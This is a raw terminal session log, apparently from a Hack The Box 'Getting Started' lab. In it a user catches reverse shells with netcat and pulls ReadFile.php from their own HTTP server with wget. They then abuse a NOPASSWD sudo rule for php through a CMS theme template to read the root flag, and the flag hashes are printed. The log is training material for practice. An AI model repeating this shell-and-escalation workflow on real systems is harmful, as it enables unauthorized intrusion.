@@ -1,0 +1,282 @@
+Script started on 2025-01-01 09:27:05-05:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="190" LINES="35"]
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mc[Knc -lvnp 9443
+[?2004l]0;nc -lvnp 9443 - Parrot Terminallistening on [any] 9443 ...
+connect to [10.10.15.249] from (UNKNOWN) [10.129.154.16] 38266
+/bin/sh: 0: can't access tty; job control turned off
+$ cd /home
+$ ls
+mrb3n
+$ cat mrb3n/user.txt
+7002d65b149b0a4d19132a66feed21d8
+$ echo "starting http sserver^[[D^[[D^[[D                  erver on new terminal to get te he TES   ReadFile.php from my ssystem to the target"
+starting http server on new terminal to get the ReadFile.php from my ssystem to the target
+$ what python
+/bin/sh: 5: what: not found
+$ which python
+$ wget http://10.10.14 5.249:8080/L ReadFile.php
+--2025-01-01 14:38:41--  http://10.10.15.249:8080/ReadFile.php
+Connecting to 10.10.15.249:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 368 [application/octet-stream]
+ReadFile.php: Permission denied
+
+Cannot write to 'ReadFile.php' (Permission denied).
+$ ^[[A    wget http://10.10.10.  5.249:8080/ReadFIle   ile.php
+--2025-01-01 14:39:42--  http://10.10.15.249:8080/ReadFile.php
+Connecting to 10.10.15.249:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 368 [application/octet-stream]
+ReadFile.php: Permission denied
+
+Cannot write to 'ReadFile.php' (Permission denied).
+$ ls
+mrb3n
+$ cd mr	
+/bin/sh: 10: cd: can't cd to mr
+$ cd mrb3n
+$ wget http://10.10.15.249:8080/ReadFile.php
+--2025-01-01 14:40:10--  http://10.10.15.249:8080/ReadFile.php
+Connecting to 10.10.15.249:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 368 [application/octet-stream]
+ReadFile.php: Permission denied
+
+Cannot write to 'ReadFile.php' (Permission denied).
+$ ls
+user.txt
+$ touch ReadFIle.tx  php
+touch: cannot touch 'ReadFIle.php': Permission denied
+$ ^[[A    vim ReadFile.php
+Vim: Warning: Output is not to a terminal
+Vim: Warning: Input is not from a terminal
+[m[m[0m[H[2J[24;1H"ReadFile.php" [New File][2;1H[1m[34m~                                                                               [3;1H~                                                                               [4;1H~                                                                               [5;1H~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                                                               [14;1H~                                                                               [15;1H~                                                                               [16;1H~                                                                               [17;1H~                                                                               [18;1H~                                                                               [19;1H~                                                                               [20;1H~                                                                               [21;1H~                                                                               [22;1H~                                                                               [23;1H~                                                                               [0m[24;63H0,0-1[9CAll[1;1Hp ; :p  
+[24;53H^@[1;1H[24;53H  [1;1Hp
+[24;1H[1m[37m[41mE353: Nothing in register "[0m[24;63H[K[24;63H0,0-1[9CAll[1;1H[24;53H^@[1;1H[24;53H  [1;1Hexit
+[24;1H[1m-- INSERT --[0m[24;13H[K[24;63H0,1[11CAll[1;1Ht[2;1H[K[24;63H2[2;1Hp 
+[3;1H[K[24;63H3[3;1H:wq
+:wq[4;1H[K[24;63H4[4;1H^C
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mnc -lvnp 9443
+[?2004l]0;nc -lvnp 9443 - Parrot Terminallistening on [any] 9443 ...
+connect to [10.10.15.249] from (UNKNOWN) [10.129.154.16] 38440
+/bin/sh: 0: can't access tty; job control turned off
+$ cd /home/mrb3n
+$ ls
+user.txt
+$ sudo -l
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+$ sudo /usr/bin/php <?php echo /root/flag.txt ?>
+/bin/sh: 5: Syntax error: newline unexpected
+$ sudo /urs  sr/bin/php <?php ?>
+/bin/sh: 6: Syntax error: newline unexpected
+$ sudo /usr/bin/pg hp echo "Hello"
+Could not open input file: echo
+$ sudo /usr/bin/php <? echo "Hello" ?>
+/bin/sh: 8: Syntax error: newline unexpected
+$ vim D Rad   ReadFile.php
+Vim: Warning: Output is not to a terminal
+Vim: Warning: Input is not from a terminal
+[m[m[0m[H[2J[24;1H[1m[37m[41mE325: ATTENTION[0m
+Found a swap file by the name "/var/tmp/ReadFile.php.swp"
+[10Cowned by: www-data   dated: Wed Jan 01 14:41:50 2025
+[9Cfile name: /home/mrb3n/ReadFile.php
+[10Cmodified: YES
+[9Cuser name: www-data   host name: gettingstarted
+[8Cprocess ID: 1874 (STILL RUNNING)
+While opening file "ReadFile.php"
+      CANNOT BE FOUND
+(1) Another program may be editing the same file.  If this is the case,
+    be careful not to end up with two different instances of the same
+    file when making changes.  Quit, or continue with caution.
+(2) An edit session for this file crashed.
+    If this is the case, use ":recover" or "vim -r ReadFile.php"
+    to recover the changes (see ":help recovery").
+    If you did this already, delete the swap file "/var/tmp/ReadFile.php.swp"
+    to avoid this message.
+
+[32mSwap file "/var/tmp/ReadFile.php.swp" already exists![0m
+[32m[O]pen Read-Only, (E)dit anyway, (R)ecover, (Q)uit, (A)bort: R
+[0m[24;1H[K[24;1H"ReadFile.php" [New File]
+Using swap file "/var/tmp/ReadFile.php.swp"
+Original file "/home/mrb3n/ReadFile.php"
+[23;1H"/home/mrb3n/ReadFile.php" [New File][23;38H[K[24;1HRecovery completed. You should check if everything is OK.
+(You might want to write out this file under another name
+and run diff with the original file to check for changes)
+You may want to delete the .swp file now.
+
+
+[32mPress ENTER or type command to continue
+[0m[1;1H[9L[1;1Ht
+
+:wq
+
+[1m[34m~                                                                               [6;1H~                                                                               [7;1H~                                                                               [8;1H~                                                                               [9;1H~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                                                               [14;1H~                                                                               [15;1H~                                                                               [16;1H~                                                                               [17;1H~                                                                               [18;1H~                                                                               [19;1H~                                                                               [20;1H~                                                                               [21;1H~                                                                               [22;1H~                                                                               [23;1H~                                                                               [0m[24;1H[K[24;63H1,1[11CAll[1;1H^[[3~^[[3~          ^[[B    ^[[C    ^[i   :q
+[24;63H[K[24;1H:q[1m[37m[41mE37: No write since last change (add ! to override)[0m[11C1,1[11CAll[1;1H:Q q!
+[24;1H[K[24;1H:q![24;1H[K[24;1H$ ^C
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m
+[?2004l[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mnc -lvnp 9443
+[?2004l]0;nc -lvnp 9443 - Parrot Terminallistening on [any] 9443 ...
+connect to [10.10.15.249] from (UNKNOWN) [10.129.154.16] 38542
+/bin/sh: 0: can't access tty; job control turned off
+$ cd /var/ 
+;$  cd www
+$ ls
+html
+$ cd html
+$ ls
+LICENSE.txt
+admin
+backups
+data
+gsconfig.php
+index.php
+plugins
+readme.txt
+robots.txt
+sitemap.xml
+theme
+$ cd theme
+$ ls
+Cardinal
+Innovation
+$ cd Inno	
+/bin/sh: 8: cd: can't cd to Inno
+$ cd Innovation
+$ ls
+assets
+footer.inc.php
+functions.php
+header.inc.php
+images
+sidebar.inc.php
+style.css
+template.php
+$ sudo /bin   usr/bin/php template.php
+ $ whoami
+www-data
+$ sudo /usr/bin/php template.php
+The file does not exist or is not accessible.$ ls
+assets
+footer.inc.php
+functions.php
+header.inc.php
+images
+sidebar.inc.php
+style.css
+template.php
+$ sudo -l
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+$ sudo /usr/bin/ php      php template.php
+The file does not exist or is not accessible.$ 
+$ sudo /usr/bin/php template.php
+File Contents:
+f1fba6e9f71efb2630e6e34da6387842
+$ exit
+^C
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mecho "" [C[1@s[1@o[1@ [1@i[1@ [1@u[1@p[1@l[1@o[1@a[1@d[1@e[1@d[1@ [1@t[1@h[1@e[1@ [1@c[1@o[1@n[1@t[1@e[1@n[1@t[1@s[1@ [1@o[1@f[1@ [1@t[1@h[1@e[1@ [1@R[1@e[1@a[1@d[1@F[1@i[1@l[1@e[1@.[1@p[1@h[1@p[1@ [1@t[1@o[1@ [1@t[1@h[1@e[1@ [1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1@c[1@o[1@p[1@y[1@ [1@p[1@a[1@s[1@t[1@e[1@d[1@ [1@t[1@h[1@e[1@ [1@c[1@o[1@n[1@t[1@e[1@n[1@t[1@s[1@ [1@o[1@f[1@ [1@t[1@h[1@e[1@ [1@r[1@e[1@a[1@d[1@f[1@i[1@l[1@e[1@.[1@p[1@h[1@p[1@ [1@t[1@o[1@ [1@t[1@h[1@e[1@ [1@t[1@h[1@e[1@m[1@e[1@-[1@>[1@e[1@d[1@i[1@t[1@ [1@c[1@o[1@m[1@p[1@o[1@n[1@e[1@n[1@t[1@ [1@a[1@n[1@d[1@ [1@t[1@h[1@e[1@n[1@ [1@e[1@x[1@e[1@c[1@u[1@t[1@e[1@d[1@ [1@t[1@h[1@e[1@ [1@f[1@i[1@l[1@e[1@ [1@w[1@h[1@i[1@c[1@h[1@ [1@w[1@a[1@s[1@ [1@l[1@o[1@a[1P[1@c[1@a[1@t[1@e[1@d[1@ [1@i[1@n[1@ [1@/[1@v[1@a[1@r[1@/[1@w[1@w[1@w[1@/[1@h[1@t[1@m[1@l[1@ [1P[1@/[1@t[1@h[1@e[1@m[1@e[1@/[1@I[1@n[1@n[1@o[1@v[1@a[1@t[1@i[1@o[1@n[1@/[1@t[1@e[1@m[1@p[1@l[1@a[1@t[1@e[1@.[1@p[1@h[1@p[1@ [1@j[1@u[1@s[1@t "  [A[0;31m└──╼ [0m[01;33m$[0m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cl" [A[0;31m└──╼ [0m[01;33m$[0m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ci" [1@k[1@e[1@ [1@w[1@e[1@ [1@d[1@i[1@d[1@ [1@g[1@f[1@o[1P[1P[1P[1@f[1@o[1@r[1@ [1@t[1@h[1@e[1@ [1@c[1@o[1@n[1@n[1@e[1@c[1@t[1@i[1@o[1@n
+[?2004l]0;echo "so i copy pasted the contents of the readfile.php to the theme->edit component and then executed the file which was located in /var/www/html/theme/Innovation/template.php just like we did for the connection" - Parrot Terminalso i copy pasted the contents of the readfile.php to the theme->edit component and then executed the file which was located in /var/www/html/theme/Innovation/template.php just like we did for the connection
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mecho "so i copy pasted the contents of the readfile.php to the theme->edit component and then executed the file which was located in /var/www/html/theme/Innovation/template.php just like we did for the connection" [A[C[C[C[C[C[Cnc -lvnp 9443[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[?2004l]0;nc -lvnp 9443 - Parrot Terminallistening on [any] 9443 ...
+^C
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mip a
+[?2004l]0;ip a - Parrot Terminal1: [36mlo: [0m<LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback [33m00:00:00:00:00:00[0m brd [33m00:00:00:00:00:00[0m
+    inet [35m127.0.0.1[0m/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 [34m::1[0m/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: [36menp0s3: [0m<BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state [32mUP [0mgroup default qlen 1000
+    link/ether [33m08:00:27:ad:9a:ea[0m brd [33mff:ff:ff:ff:ff:ff[0m
+    inet [35m10.0.2.15[0m/24 brd [35m10.0.2.255 [0mscope global dynamic noprefixroute enp0s3
+       valid_lft 79659sec preferred_lft 79659sec
+    inet6 [34mfe80::a41d:9231:fdc:39e3[0m/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+33: [36mtun0: [0m<POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none 
+    inet [35m10.10.15.249[0m/23 brd [35m10.10.15.255 [0mscope global noprefixroute tun0
+       valid_lft forever preferred_lft forever
+    inet6 [34mdead:beef:2::11f7[0m/64 scope global noprefixroute 
+       valid_lft forever preferred_lft forever
+    inet6 [34mfe80::e415:9eda:33e8:f8c8[0m/64 scope link stable-privacy proto kernel_ll 
+       valid_lft forever preferred_lft forever
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mip a
+[?2004l]0;ip a - Parrot Terminal1: [36mlo: [0m<LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback [33m00:00:00:00:00:00[0m brd [33m00:00:00:00:00:00[0m
+    inet [35m127.0.0.1[0m/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 [34m::1[0m/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: [36menp0s3: [0m<BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state [32mUP [0mgroup default qlen 1000
+    link/ether [33m08:00:27:ad:9a:ea[0m brd [33mff:ff:ff:ff:ff:ff[0m
+    inet [35m10.0.2.15[0m/24 brd [35m10.0.2.255 [0mscope global dynamic noprefixroute enp0s3
+       valid_lft 79637sec preferred_lft 79637sec
+    inet6 [34mfe80::a41d:9231:fdc:39e3[0m/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+33: [36mtun0: [0m<POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none 
+    inet [35m10.10.15.249[0m/23 brd [35m10.10.15.255 [0mscope global noprefixroute tun0
+       valid_lft forever preferred_lft forever
+    inet6 [34mdead:beef:2::11f7[0m/64 scope global noprefixroute 
+       valid_lft forever preferred_lft forever
+    inet6 [34mfe80::e415:9eda:33e8:f8c8[0m/64 scope link stable-privacy proto kernel_ll 
+       valid_lft forever preferred_lft forever
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mip anc -lvnp 9443
+[?2004l]0;nc -lvnp 9443 - Parrot Terminallistening on [any] 9443 ...
+^C
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mecho ""t"r"u"[1P"y"i"n"g" "a"n"o"t"h"e"r" "m"e"t"h"o"d"[1P"[C[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"[1P"c"o"m"p"l"e"t"e"d" "t"h"e" "t"e"s"t" "b"u"t" "w"a"n"t" "t"o" "t"r"y" "a"n"o"t"h"e"r" "m"e"t"h"o"d"
+[?2004l]0;echo "completed the test but want to try another method" - Parrot Terminalcompleted the test but want to try another method
+[?2004h[0;31m┌─[[0;39mtiger[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Desktop/HTB/1_GettingStarted/Test[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexit
+[?2004l]0;exit - Parrot Terminalexit
+
+Script done on 2025-01-01 10:12:28-05:00 [COMMAND_EXIT_CODE="0"]
